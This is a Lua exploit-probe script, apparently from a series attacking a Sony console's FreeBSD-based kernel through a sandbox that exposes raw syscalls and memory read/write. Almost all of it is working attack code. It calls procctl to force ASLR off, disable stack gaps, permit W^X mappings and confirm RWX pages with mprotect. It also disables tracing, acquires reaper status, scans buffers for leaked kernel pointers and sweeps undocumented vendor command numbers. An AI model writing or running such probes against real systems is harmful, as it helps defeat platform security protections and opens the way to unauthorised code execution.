-- CRASH_CLASS: LOW
-- PROBE 121a: procctl(544) comprehensive via make_syscall
--
-- Context: Probe 42j tested procctl via resolve() → "blocked".
-- But resolve() failures DON'T mean make_syscall failures!
-- (sysctl via resolve = -1, but make_syscall(202) works perfectly.)
--
-- FreeBSD procctl commands include:
--   PROC_ASLR_CTL (13)  — disable ASLR for the process!
--   PROC_ASLR_STATUS (14) — read current ASLR mode
--   PROC_STACKGAP_CTL (17) — control stack gap
--   PROC_STACKGAP_STATUS (18) — read stack gap info
--   PROC_TRACE_CTL (7) — enable/disable tracing
--   PROC_TRACE_STATUS (8) — read trace status
--   PROC_SPROTECT (1) — protection flags
--   PROC_REAP_ACQUIRE (2) — become process reaper
--   PROC_NO_NEW_PRIVS_CTL (19) — no new privileges
--
-- If PROC_ASLR_CTL(13) works with PROC_ASLR_FORCE_DISABLE(2):
-- the NEXT connection might have predictable addresses!
--
-- Section A: All read-only status commands (safe)
-- Section B: PROC_ASLR_CTL — try to disable ASLR
-- Section C: PROC_STACKGAP_CTL — stack layout control
-- Section D: PROC_SPROTECT, PROC_REAP, other control commands
-- Section E: Kernel pointer scan in output buffers

print("=== PROBE 121a: PROCCTL COMPREHENSIVE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end

collectgarbage("stop")

-- procctl(idtype_t idtype, id_t id, int cmd, void *data)
-- idtype: P_PID=0
local sc_procctl = make_syscall(544)
local sc_getpid = make_syscall(20)

local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("[*] PID: " .. pid)

-- FreeBSD procctl commands
local PROC_SPROTECT        = 1
local PROC_REAP_ACQUIRE    = 2
local PROC_REAP_RELEASE    = 3
local PROC_REAP_STATUS     = 4
local PROC_REAP_GETPIDS    = 5
local PROC_TRACE_CTL       = 7
local PROC_TRACE_STATUS    = 8
local PROC_TRAPCAP         = 9
local PROC_ASLR_CTL        = 13
local PROC_ASLR_STATUS     = 14
local PROC_PROTMAX_CTL     = 15
local PROC_PROTMAX_STATUS  = 16
local PROC_STACKGAP_CTL    = 17
local PROC_STACKGAP_STATUS = 18
local PROC_NO_NEW_PRIVS_CTL    = 19
local PROC_NO_NEW_PRIVS_STATUS = 20
local PROC_WXMAP_CTL       = 21
local PROC_WXMAP_STATUS    = 22

-- P_PID = 0
local P_PID = 0


-- ================================================================
-- SECTION A: All read-only status commands
-- ================================================================
print("")
print("--- SECTION A: Read-only status commands ---")
print("")

local data_buf = memory.alloc(256)

local status_cmds = {
    { cmd = PROC_ASLR_STATUS,     name = "PROC_ASLR_STATUS",     size = 4 },
    { cmd = PROC_TRACE_STATUS,    name = "PROC_TRACE_STATUS",    size = 4 },
    { cmd = PROC_PROTMAX_STATUS,  name = "PROC_PROTMAX_STATUS",  size = 4 },
    { cmd = PROC_STACKGAP_STATUS, name = "PROC_STACKGAP_STATUS", size = 4 },
    { cmd = PROC_NO_NEW_PRIVS_STATUS, name = "PROC_NO_NEW_PRIVS_STATUS", size = 4 },
    { cmd = PROC_WXMAP_STATUS,    name = "PROC_WXMAP_STATUS",    size = 4 },
    { cmd = PROC_REAP_STATUS,     name = "PROC_REAP_STATUS",     size = 64 },
}

for _, sc in ipairs(status_cmds) do
    -- Zero the buffer
    for i = 0, sc.size - 1, 4 do safe_wd(data_buf + i, 0) end
    -- Pad extra
    for i = sc.size, 63, 4 do safe_wd(data_buf + i, 0) end

    local rv = -999
    pcall(function()
        rv = to_num(sc_procctl(
            uint64(P_PID), uint64(pid), uint64(sc.cmd), uint64(data_buf)))
    end)

    local val = safe_rd(data_buf)
    local result_str = string.format("ret=%d val=0x%08X (%d)", rv, val or 0, val or 0)

    -- For REAP_STATUS, dump more
    if sc.cmd == PROC_REAP_STATUS and rv == 0 then
        result_str = result_str .. " +4:" .. string.format("0x%08X", safe_rd(data_buf + 4) or 0)
        result_str = result_str .. " +8:" .. string.format("0x%08X", safe_rd(data_buf + 8) or 0)
    end

    print(string.format("  %-28s %s", sc.name, result_str))

    -- Interpret ASLR status
    if sc.cmd == PROC_ASLR_STATUS and rv == 0 then
        if val == 1 then print("    → ASLR_FORCE_ENABLE (locked on)")
        elseif val == 2 then print("    → ASLR_FORCE_DISABLE (locked off!)")
        elseif val == 3 then print("    → ASLR_NOFORCE (default)")
        elseif val == 4 then print("    → ASLR enabled by system default")
        else print("    → unknown mode " .. (val or "nil"))
        end
    end

    -- Interpret STACKGAP status
    if sc.cmd == PROC_STACKGAP_STATUS and rv == 0 then
        if val and val > 0 then
            print(string.format("    → stack gap = %d bytes (0x%X)", val, val))
        end
    end

    -- Kernel pointer check in output
    for off = 0, sc.size - 8, 8 do
        local qval = safe_rq(data_buf + off)
        if is_kptr(qval) then
            local kh, kl = get_hi_lo(qval)
            print(string.format("    !!! KERNEL PTR at +0x%02X: 0x%08X_%08X !!!", off, kh, kl))
        end
    end
end


-- ================================================================
-- SECTION B: PROC_ASLR_CTL — try to disable ASLR
-- ================================================================
print("")
print("--- SECTION B: PROC_ASLR_CTL ---")
print("")

-- PROC_ASLR_FORCE_ENABLE = 1
-- PROC_ASLR_FORCE_DISABLE = 2
-- PROC_ASLR_NOFORCE = 3

local aslr_modes = {
    { val = 2, name = "PROC_ASLR_FORCE_DISABLE" },
    { val = 3, name = "PROC_ASLR_NOFORCE" },
    { val = 1, name = "PROC_ASLR_FORCE_ENABLE" },
}

for _, mode in ipairs(aslr_modes) do
    safe_wd(data_buf, mode.val)
    local rv = -999
    pcall(function()
        rv = to_num(sc_procctl(
            uint64(P_PID), uint64(pid), uint64(PROC_ASLR_CTL), uint64(data_buf)))
    end)
    print(string.format("[B] %s (%d): ret=%d", mode.name, mode.val, rv))

    if rv == 0 then
        print("[B] *** PROC_ASLR_CTL ACCEPTED! ***")
        -- Read back status
        safe_wd(data_buf, 0)
        local rv2 = -999
        pcall(function()
            rv2 = to_num(sc_procctl(
                uint64(P_PID), uint64(pid), uint64(PROC_ASLR_STATUS), uint64(data_buf)))
        end)
        local new_mode = safe_rd(data_buf)
        print(string.format("[B] Status after: ret=%d mode=%d", rv2, new_mode or -1))

        if mode.val == 2 and new_mode == 2 then
            print("[B] *** ASLR DISABLED! Next connections may have predictable addresses! ***")
        end
    end
end


-- ================================================================
-- SECTION C: PROC_STACKGAP_CTL
-- ================================================================
print("")
print("--- SECTION C: PROC_STACKGAP_CTL ---")
print("")

-- PROC_STACKGAP_ENABLE = 0x0001
-- PROC_STACKGAP_DISABLE = 0x0002
-- PROC_STACKGAP_ENABLE_EXEC = 0x0004
-- PROC_STACKGAP_DISABLE_EXEC = 0x0008

local gap_modes = {
    { val = 2, name = "STACKGAP_DISABLE" },
    { val = 8, name = "STACKGAP_DISABLE_EXEC" },
    { val = 1, name = "STACKGAP_ENABLE" },
}

for _, mode in ipairs(gap_modes) do
    safe_wd(data_buf, mode.val)
    local rv = -999
    pcall(function()
        rv = to_num(sc_procctl(
            uint64(P_PID), uint64(pid), uint64(PROC_STACKGAP_CTL), uint64(data_buf)))
    end)
    print(string.format("[C] %s (%d): ret=%d", mode.name, mode.val, rv))
end


-- ================================================================
-- SECTION D: Control commands
-- ================================================================
print("")
print("--- SECTION D: Control commands ---")
print("")

-- PROC_TRACE_CTL: disable ptrace attachment
-- PROC_TRACE_CTL_ENABLE = 1, DISABLE = 2, DISABLE_EXEC = 3
safe_wd(data_buf, 2)
local rv_trace = -999
pcall(function()
    rv_trace = to_num(sc_procctl(
        uint64(P_PID), uint64(pid), uint64(PROC_TRACE_CTL), uint64(data_buf)))
end)
print(string.format("[D1] PROC_TRACE_CTL(DISABLE=2): ret=%d", rv_trace))

-- PROC_SPROTECT
-- PPROT_SET = 1, PPROT_CLEAR = 2
-- PPROT_DESCEND = 0x10, PPROT_INHERIT = 0x20
safe_wd(data_buf, 1 + 0x10)  -- PPROT_SET | PPROT_DESCEND
local rv_sprot = -999
pcall(function()
    rv_sprot = to_num(sc_procctl(
        uint64(P_PID), uint64(pid), uint64(PROC_SPROTECT), uint64(data_buf)))
end)
print(string.format("[D2] PROC_SPROTECT(SET|DESCEND): ret=%d", rv_sprot))

-- PROC_REAP_ACQUIRE — become a process reaper
local rv_reap = -999
pcall(function()
    rv_reap = to_num(sc_procctl(
        uint64(P_PID), uint64(pid), uint64(PROC_REAP_ACQUIRE), uint64(0)))
end)
print(string.format("[D3] PROC_REAP_ACQUIRE: ret=%d", rv_reap))

if rv_reap == 0 then
    print("[D3] *** We are now a process reaper! ***")
    -- Release immediately
    pcall(function()
        sc_procctl(uint64(P_PID), uint64(pid), uint64(PROC_REAP_RELEASE), uint64(0))
    end)
end

-- PROC_NO_NEW_PRIVS_CTL
safe_wd(data_buf, 1)
local rv_nnp = -999
pcall(function()
    rv_nnp = to_num(sc_procctl(
        uint64(P_PID), uint64(pid), uint64(PROC_NO_NEW_PRIVS_CTL), uint64(data_buf)))
end)
print(string.format("[D4] PROC_NO_NEW_PRIVS_CTL(1): ret=%d", rv_nnp))

-- PROC_WXMAP_CTL — W^X mapping control
-- PROC_WX_MAPPINGS_PERMIT = 1
-- PROC_WX_MAPPINGS_DISALLOW_EXEC = 2
safe_wd(data_buf, 1)
local rv_wx = -999
pcall(function()
    rv_wx = to_num(sc_procctl(
        uint64(P_PID), uint64(pid), uint64(PROC_WXMAP_CTL), uint64(data_buf)))
end)
print(string.format("[D5] PROC_WXMAP_CTL(PERMIT=1): ret=%d", rv_wx))

if rv_wx == 0 then
    print("[D5] *** W^X MAPPING PERMITTED! ***")
    -- Immediately test mprotect(RWX)
    local sc_mprotect = make_syscall(74)
    local test_page = memory.alloc(0x4000)
    local rv_mprot = -999
    pcall(function()
        rv_mprot = to_num(sc_mprotect(uint64(test_page), uint64(0x4000), uint64(7)))
    end)
    print(string.format("[D5] mprotect(RWX) after WXMAP_PERMIT: ret=%d", rv_mprot))
    if rv_mprot == 0 then
        print("[D5] *** RWX MAPPING WORKS! W^X BYPASS! ***")
    end
end

-- PROC_TRAPCAP
safe_wd(data_buf, 1)
local rv_tc = -999
pcall(function()
    rv_tc = to_num(sc_procctl(
        uint64(P_PID), uint64(pid), uint64(PROC_TRAPCAP), uint64(data_buf)))
end)
print(string.format("[D6] PROC_TRAPCAP(1): ret=%d", rv_tc))

-- PROC_PROTMAX_CTL
-- PROC_PROTMAX_FORCE_ENABLE = 1
-- PROC_PROTMAX_FORCE_DISABLE = 2
-- PROC_PROTMAX_NOFORCE = 3
safe_wd(data_buf, 2)
local rv_pm = -999
pcall(function()
    rv_pm = to_num(sc_procctl(
        uint64(P_PID), uint64(pid), uint64(PROC_PROTMAX_CTL), uint64(data_buf)))
end)
print(string.format("[D7] PROC_PROTMAX_CTL(DISABLE=2): ret=%d", rv_pm))


-- ================================================================
-- SECTION E: Sony-specific command sweep (high numbers)
-- ================================================================
print("")
print("--- SECTION E: Sony-specific procctl commands ---")
print("")

-- Sony may have added custom procctl commands at high numbers
-- FreeBSD uses 1-22, so test 23-50 for Sony extensions
for cmd = 23, 50 do
    for i = 0, 63, 4 do safe_wd(data_buf + i, 0) end
    local rv = -999
    pcall(function()
        rv = to_num(sc_procctl(
            uint64(P_PID), uint64(pid), uint64(cmd), uint64(data_buf)))
    end)
    if rv ~= -1 then
        local val = safe_rd(data_buf)
        print(string.format("  cmd=%d ret=%d buf[0]=0x%08X", cmd, rv, val or 0))
    end
end

-- Also test with idtype = 1 (P_PGID)
print("")
print("[E2] procctl with idtype=1 (P_PGID):")
safe_wd(data_buf, 0)
local rv_pgid = -999
pcall(function()
    rv_pgid = to_num(sc_procctl(
        uint64(1), uint64(pid), uint64(PROC_ASLR_STATUS), uint64(data_buf)))
end)
local pgid_val = safe_rd(data_buf)
print(string.format("  ASLR_STATUS idtype=P_PGID: ret=%d val=%d", rv_pgid, pgid_val or -1))

print("")
print("=== PROBE 121a COMPLETE ===")
